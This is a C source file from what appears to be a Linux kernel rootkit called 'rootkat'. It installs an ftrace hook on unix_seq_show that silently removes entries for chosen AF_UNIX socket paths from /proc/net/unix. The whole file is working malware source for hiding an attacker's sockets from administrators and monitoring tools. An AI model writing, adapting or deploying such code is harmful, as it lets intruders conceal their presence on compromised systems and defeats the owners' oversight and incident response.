// SPDX-License-Identifier: MIT
#include <linux/kernel.h>
#include <linux/seq_file.h>
#include <linux/un.h>
#include <net/sock.h>
#include <net/af_unix.h>
#include "ftrace_hook.h"
#include "hidden_unix_paths.h"
#include "hook_unix_seq_show.h"

#define TAG "rootkat/hook_unix_seq_show: "

static const char * const unix_seq_show_candidates[] = {
	"unix_seq_show", NULL,
};

typedef int (*unix_seq_show_t)(struct seq_file *seq, void *v);

static int rootkat_unix_seq_show(struct seq_file *seq, void *v);

static struct rootkat_hook hook_unix_seq_show = {
	.candidates  = unix_seq_show_candidates,
	.replacement = rootkat_unix_seq_show,
};

/*
 * v is SEQ_START_TOKEN for the header row or a struct sock * for each
 * AF_UNIX socket. The bound path lives in unix_sk(sk)->addr; len
 * includes sa_family_t (2 bytes), and the path bytes are
 * sun_path[0..len-2). Returning 0 silently drops the line — the
 * iterator advances normally so /proc/net/unix prints the rest.
 */
static int rootkat_unix_seq_show(struct seq_file *seq, void *v)
{
	unix_seq_show_t orig = (unix_seq_show_t)hook_unix_seq_show.original;

	if (v != SEQ_START_TOKEN) {
		struct sock *sk = (struct sock *)v;
		struct unix_sock *u = unix_sk(sk);
		struct unix_address *addr = u ? u->addr : NULL;

		if (addr && addr->len > (int)sizeof(short)) {
			unsigned int plen = addr->len - sizeof(short);

			if (rootkat_is_unix_path_hidden(addr->name->sun_path, plen))
				return 0;
		}
	}

	return orig(seq, v);
}

int rootkat_hook_unix_seq_show_install(void)
{
	return rootkat_hook_install(&hook_unix_seq_show);
}

void rootkat_hook_unix_seq_show_remove(void)
{
	rootkat_hook_remove(&hook_unix_seq_show);
}
